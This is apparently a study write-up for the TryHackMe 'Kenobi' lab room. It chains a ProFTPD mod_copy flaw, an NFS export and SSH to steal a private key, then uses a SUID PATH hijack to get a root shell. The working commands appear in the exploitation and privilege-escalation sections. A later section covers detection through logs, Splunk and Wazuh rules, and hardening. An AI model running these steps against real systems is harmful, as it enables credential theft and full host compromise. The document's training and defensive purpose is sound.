# Kenobi — TryHackMe

> **Preparation stub.** Based on publicly documented information about this retired room — not an
> original solve, and no live flag values are recorded. Complete the bracketed fields when working
> the room under your own account. Only document legally authorised activity.

## Engagement metadata

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | Kenobi |
| Difficulty | Easy |
| Category | Linux |
| Target IP | 10.x.x.x (lab-assigned) |
| Date completed | [YYYY-MM-DD] |

## Executive summary

A Linux host running a vulnerable **ProFTPD 1.3.5**, an exposed **Samba** share, and an NFS export.
The chain abuses ProFTPD's `mod_copy` to stage an SSH key into an NFS-mounted path, gains a foothold
over SSH, then escalates to root via a **SUID binary with an unsafe `PATH`** dependency. Teaches
service-chaining and SUID/PATH privilege escalation.

## Scenario value (study scaffold)

- **What it tests:** multi-service enumeration and *service chaining* — combining a ProFTPD bug, an
  NFS export, and SSH into one path, then a SUID/PATH privilege escalation.
- **What completing it demonstrates:** the habit of enumerating *every* service and reasoning about
  how they connect (no single bug suffices), plus classic Linux privesc via an unsafe SUID binary
  (MITRE T1574.007 / T1548.001).

## Key vulnerability class

- **Foothold:** ProFTPD **1.3.5 `mod_copy`** arbitrary file copy — **CVE-2015-3306** (the
  `SITE CPFR`/`CPTO` commands allow copying files without authentication). *Verify CVE when citing.*
- **Privesc:** insecure **SUID** binary (`/usr/bin/menu`) that calls system utilities **by relative
  name**, exploitable via **`PATH` manipulation** (CWE-426 Untrusted Search Path / CWE-732 weak
  permissions).
- **Enabler:** **NFS** export and Samba misconfiguration exposing file paths.

## 1. Reconnaissance

```
nmap -sC -sV -p- -oA nmap/kenobi 10.x.x.x
```

Expected exposed surface (confirm on completion):

| Port | Service | Version | Note |
|------|---------|---------|------|
| 21/tcp | ftp | ProFTPD 1.3.5 | **Foothold — mod_copy** |
| 22/tcp | ssh | OpenSSH | Login path after key theft |
| 80/tcp | http | Apache | Web surface (enumerate) |
| 111/tcp | rpcbind | — | Maps to NFS (2049) |
| 139/445 tcp | smb | Samba | Share enumeration / path disclosure |
| 2049/tcp | nfs | — | **The staging target** |

[Paste trimmed scan output on completion.]

**nmap flag rationale:**
- `-p-` — all 65,535 TCP ports. Essential here: the solve *chains* services (FTP + SMB + NFS + SSH),
  so missing any one open port loses the path.
- `-sV` — version detection. Pins `ProFTPD 1.3.5` (the `mod_copy` foothold) and the rpcbind/NFS
  presence; the ProFTPD version is the load-bearing fact.
- `-sC` — default scripts; `nfs-showmount` and `rpcinfo` hints surface the export early.
- `-oA nmap/kenobi` — preserve the multi-service surface for the chaining logic.

**What to look for in the scan:** a *combination* — ProFTPD 1.3.5 on 21, Samba on 139/445, and
rpcbind (111) implying NFS (2049). No single service is the answer; the win is recognising that the
FTP bug can write to a path the NFS export will let you read. Map the connections, not just the ports.

## 2. Enumeration

```
# Samba shares + NSE
nmap --script "smb-enum-shares,smb-enum-users" -p139,445 10.x.x.x
smbclient -L //10.x.x.x/ -N
smbclient //10.x.x.x/anonymous -N        # read any world-readable share

# NFS exports
showmount -e 10.x.x.x
```

- The Samba share commonly leaks a file path / config hint pointing at the user's home and the
  location of the SSH private key.
- `showmount -e` reveals a **writable / mountable NFS export** (e.g. `/var`) — this is where the
  `mod_copy` step will drop the key. [Record share listing + export path on completion.]

**What to look for after SMB/NFS enumeration:** two specific facts that make the chain possible.
From Samba: the **disclosed path to `id_rsa`** (the share leaks the user's home/SSH key location).
From `showmount -e`: a **mountable export whose path overlaps a directory ProFTPD can write to**
(e.g. `/var`). The exploit only works if the FTP `CPTO` destination sits *inside* the NFS export —
the enumeration is what confirms those two paths line up before you spend time on the copy.

## 3. Exploitation

**Step A — copy the SSH private key with ProFTPD `mod_copy` (unauthenticated)
[ATT&CK T1190 — Exploit Public-Facing Application; T1552.004 — Unsecured Credentials: Private Keys]:**

```
nc 10.x.x.x 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa            # CPTO target must sit under the NFS-exported path
```

**Step B — mount the NFS export and retrieve the key:**

```
mkdir /mnt/kenobiNFS
mount -t nfs 10.x.x.x:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
```

**Step C — log in over SSH with the stolen key
[ATT&CK T1021.004 — Remote Services: SSH]:**

```
ssh -i id_rsa kenobi@10.x.x.x
```

- **User flag:** `[capture on completion]`

## 4. Privilege escalation

```
find / -perm -4000 2>/dev/null        # SUID hunt → /usr/bin/menu
strings /usr/bin/menu                 # shows it calls e.g. `curl`/`ifconfig` by RELATIVE name
```

- `/usr/bin/menu` is SUID-root and invokes system binaries by **relative name**, so a hijacked
  `PATH` makes it run attacker code as root **[ATT&CK T1574.007 — Hijack Execution Flow: Path
  Interception by PATH Environment Variable; T1548.001 — Abuse Elevation Control: Setuid/Setgid]**:

```
cd /tmp
echo '/bin/sh' > curl                 # fake the binary the SUID program calls
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu                         # choose the option that triggers `curl` → root shell
```

- **Root flag:** `[capture on completion]`

## 5. Tools used

| Phase | Tools |
|-------|-------|
| Recon | `nmap` (`-sC -sV -p-`) |
| Enumeration | `nmap` NSE (`smb-enum-*`, `nfs-*`), `smbclient`, `showmount` |
| Exploitation | `nc`/FTP client for `mod_copy` `SITE CPFR/CPTO`; `mount -t nfs`; `ssh -i` |
| Privilege escalation | `find / -perm -4000`, `strings`, `PATH` hijack, GTFOBins reference |

## 6. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Unsecured Credentials: Private Keys | T1552.004 |
| Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Hijack Execution Flow: Path Interception | T1574.007 |
| Privilege Escalation | Abuse Elevation Control: Setuid/Setgid | T1548.001 |

## 7. Key learnings

- **Service chaining** — no single bug was sufficient; the solve came from combining mod_copy + NFS
  + SSH. Enumerate *all* services and think about how they connect.
- **`CPTO` must target the NFS path** — the whole trick is copying the key to a location you can
  then mount and read; getting the destination wrong is the usual stall point.
- **SUID + relative command = privesc** — always `strings`/`ltrace` a SUID binary to see what it
  calls and whether it trusts `PATH`. Classic, recurring real-world misconfiguration.
- **`showmount -e` is cheap and high-value** — exposed NFS exports are an easy win and easy to miss.
- **Blue-team transfer:** detect via anomalous FTP `SITE CPFR/CPTO` commands, unexpected NFS mounts,
  and SUID execution with a tampered environment.

## 8. Defender perspective — logs & detection

What this service-chaining attack looks like from a monitored SOC. The chain crosses four services,
so detection is multi-source — a good lesson in correlation. (See
[../methodology/ctf-methodology.md §7](../methodology/ctf-methodology.md).)

**Log artefacts generated:**
- **FTP/ProFTPD logs** (`/var/log/proftpd/proftpd.log`): unauthenticated `SITE CPFR` / `SITE CPTO`
  commands — `mod_copy` operations against a path under a user's `.ssh/` are almost never
  legitimate; the `CPFR ... /id_rsa` target is the smoking gun.
- **NFS / rpc logs:** a new **mount** of an export from an unexpected client IP; on the server,
  `rpc.mountd` logs the mount request. An external host mounting `/var` is anomalous.
- **auth.log / `sshd`:** a **public-key SSH login** for `kenobi` from the attacker IP shortly after
  the FTP copy — the timing correlation (FTP copy → NFS mount → SSH login, same source, seconds
  apart) is the detection, more than any single event.
- **Privesc:** the SUID `/usr/bin/menu` executing with a **tampered `PATH`** — auditd `execve`
  records show `menu` (UID 0) spawning `/tmp/curl` or `/bin/sh`; a root-SUID binary resolving a
  command out of `/tmp` is the indicator.

**Example detection logic (correlation, Splunk-style):**
```
(index=ftp "SITE CPFR" OR "SITE CPTO")
| transaction src_ip maxspan=5m
  with [search index=nfs "mount request"]
  with [search index=os sshd "Accepted publickey"]
| where mvcount(src_ip)=1
```
Plus the host privesc rule (auditd/Sigma): `parent=/usr/bin/menu AND child_path startswith /tmp`.

**Why it fires:** each step alone could be explained away, but the *sequence from one source IP in
minutes* (unauth file copy → NFS mount → key-based SSH) has no benign equivalent — this is the
correlation work a SOC does. The SUID-from-`/tmp` execution is independently high-fidelity. Maps to
**ATT&CK T1190 / T1552.004 / T1021.004 / T1574.007 / T1548.001**.

**Defensive controls:** patch ProFTPD (disable `mod_copy`); restrict NFS exports with
`root_squash` and host allow-lists; never world-readable private keys; audit SUID binaries and
ensure they call commands by absolute path; alert on SUID processes resolving binaries from
writable directories.

## Exam relevance — Sec+ SY0-701

| SY0-701 objective | How Kenobi makes it concrete |
|-------------------|------------------------------|
| **2.3** Vulnerability types | A vulnerable service version (ProFTPd `mod_copy`) *and* a misconfiguration (NFS `no_root_squash`) — the exam's "vulnerable software" and "misconfiguration" categories side by side. |
| **2.4** Indicators of malicious activity | Service enumeration and the file-write→privesc chain are the recon and post-exploitation indicators the exam expects you to recognise. |
| **3.1 / 4.1** Secure protocols & hardening | FTP/SMB/NFS exposed without controls is the case study for "use secure protocols, restrict exports, least privilege". |
| **4.x** Privilege escalation & permissions | The SUID-binary path is the hands-on form of the exam's file-permission / least-privilege material. |

**Interview line:** "Kenobi is how I revise the misconfiguration half of Domain 2 — NFS `no_root_squash`
and a SUID binary are abstract bullet points until you've actually used them to get root."

### Wazuh detection rule (→ [watchtower](../../watchtower))

Two signals: the ProFTPD `mod_copy` file-write (FTP log) and the SUID-binary privesc, which Wazuh's
**syscheck (FIM)** is purpose-built to catch:

```xml
<group name="proftpd,ftp,fim,attack,">
  <!-- Stage 1: ProFTPD SITE CPFR/CPTO arbitrary copy (mod_copy) -->
  <rule id="100460" level="12">
    <decoded_as>proftpd</decoded_as>
    <regex type="pcre2">SITE\s+(CPFR|CPTO)</regex>
    <description>ProFTPD mod_copy SITE CPFR/CPTO — arbitrary file write (T1190)</description>
    <mitre><id>T1190</id></mitre>
  </rule>
  <!-- Stage 2: FIM detects a new/changed SUID-root binary used for privesc -->
  <rule id="100461" level="13">
    <if_group>syscheck</if_group>
    <field name="file" type="pcre2">^/(usr/)?bin/|^/opt/</field>
    <description>New/changed file in a binary path — check for SUID privesc (T1548.001/T1574.007)</description>
    <mitre><id>T1548.001</id><id>T1574.007</id></mitre>
  </rule>
</group>
```
**Validation:** enable `<syscheck>` on `/bin`,`/usr/bin` with `report_changes`; perform the mod_copy
write and the SUID privesc; confirm both rules fire. Sub-techniques: **T1190** (exploit public-facing
app), **T1548.001** (setuid abuse), **T1574.007** (PATH interception), **T1552.004** (private SSH key
loot).

## 9. References

- ProFTPD mod_copy CVE-2015-3306 (verify scope before citing).
- GTFOBins — SUID / PATH-interception abuse patterns.
- MITRE ATT&CK T1190, T1552.004, T1021.004, T1574.007, T1548.001.
